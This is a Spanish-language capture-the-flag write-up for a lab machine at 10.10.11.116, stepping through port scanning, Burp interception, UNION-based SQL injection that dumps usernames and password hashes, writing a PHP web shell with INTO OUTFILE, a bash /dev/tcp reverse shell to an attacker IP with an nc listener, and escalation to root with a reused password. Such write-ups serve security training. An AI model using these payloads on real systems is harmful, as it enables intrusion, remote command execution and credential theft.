## Summary

- IP -> 10.10.11.116
- Ports -> TCP (22, 80, 8080, 4566), UDP (idk)
- OS ->  Linux 
- Services & Applications
    - 22 -> OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
    - 80 -> Apache httpd 2.4.48
    - 8080 -> http nginx / 502 Bad Gateway
    - 4566 -> http nginx / Forbidden

Launchpad -> Focal

## Recon

❯ **ping -c 1 10.10.11.116** 

❯ **nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.116 -oG allPorts**
❯ **nmap -sCV -p80 10.10.11.116 -oN targeted**

❯ **whatweb ❮http://10.10.11.116❯**
❯ **whatweb ❮http://10.10.11.116:8080❯**

Usaremos BurpSuite para interceptar la maquina en la parte del campo de la pagina web.

- Le damos en Send y despues Forward, como miramos que no sale nada lo hacemos en el **proxy** 
- Modificamos al lado de la palabra Brazil en el **Proxy** y le damos Forward
- Intercept off 
- Miramos la respuesta en la web 
- Ahora si podemos seguir modificando en el repeater en la parte de Brazil y le damos Send y Forward y todo lo podremos ver en la web.
- Si no sale recargamos la pagina y deberia de salir el resultado

Inyecciones SQLI
Estamos haciendo que nos comente el esto de la query por ende nos debe de mostrar todo el contenido visible de la pagina.
❯ **’or 1=1-- -    o    'or 1=1#** 
❯ **'order by 10-- -** 
❯ **'union select 1,2,3-- -** 
Para listar las bases de datos existentes
❯ **'union select 1,2,schema_name from information_schema.schemata -- -** Pone el resultado en forma de lista
Encontramos las DBS llamadas 'mysql' y 'registration'
Para enumerar las tablas 
❯ **'union select 1,2,table_name from information_schema.tables -- -** Lista las tablas de todas las bases de datos existentes
❯ **'union select 1,2,table_name from information_schema.tables WHERE table_schema='*DBS*'-- -** Lista las tablas de una base de datos especifica
Encontramos que la tabla tambien de llama 'registration'
Para enumerar las columnas 
❯ **'union select 1,2,column_name from information_schema.columns WHERE table_schema='*DBS*' and table_name='*TABLENAME*' -- -** Lista las columnas de una base de datos especifica, donde tambien tenemos una tabla especifica
Nos muestra ahora 4 columnas pero hay dos importantes 'username' y 'userhash'
Para mostrar la data con concatenaciones
❯ **'union select 1,2,group_concat(*username*, ':' ,*password*) from *DB.TABLENAME* -- -** Muestra los datos de las columnas obtenidas en una sola linea delimitado por los dos puntos (**: = 0x3a** representacion en hexadecimal) Hacemos esto si la base de datos actual no es la que contiene los datos que queremos 

Ahora nos disponemos a cargar un archivo y ver si lo podemos observar en la web, esto en una ruta tipica de html que es:
❯ **/var/www/html/file.php** 

Primero haremos la prueba colocando lo que sea en un archivo .php
❯ **'union select "<? system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/file.php"-- -** Podemos crear un archivo llamado 'file.php' en la ruta html que contenga un cmd que nos interpretara comandos. Primero podemos hacer una prueba, colocando lo que sea en donde esta la parte de System.
	nota: Despues del primer ? va php
	- Despues debemos de colocar en la url: **\http://1.1.1.1/prueba.php?cmd=whoami**
		- 1.1.1.1 -> IP de la victima
		- whoami -> Comando a usar, estos pueden ir variando
		Pero podemos hacer un archivo de PHP Reverse ...

Ahora que hemos agregado un archivo en la ruta del HTML. Podemos probar si tenemos ejecucion remota de comandos. 

Despues de verificar que tenemos ejecucion remota de comandos, hacemos lo siguiente. 

## User

Comando de ReverShell en PHP

❯ **bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'** -> Comando que debemos de Encodear en forma de URL y esto lo podemos colocar en BurpSuite, para despues hacerle Encoder y poderlo poner en la URL 

Despues debemos de colocar en la url: **\http://1.1.1.1/prueba.php?cmd=** Aqui

Despues nos colocamos en escucha para al momento de darle Enter a la URL, podamos recibir la Revershell
❯ **nc -nlvp 443** Nos ponemos en escucha por el puerto 443 para esperar la Revershell

Una vez adentro haciendo un ls -l podemos ver un file que se llama config.php en el cual cuando lo miremos con cat encontraremos un user y passwd.

Si nos regresamos al home del usuario podremos encontrar la flag user.txt

## Root
Despues con el siguiente comando y la passwd que habiamos encontrado, podremos convertirnos en Root
❯ **su root** Para convertirnos en root y debemos de proporcionar una passwd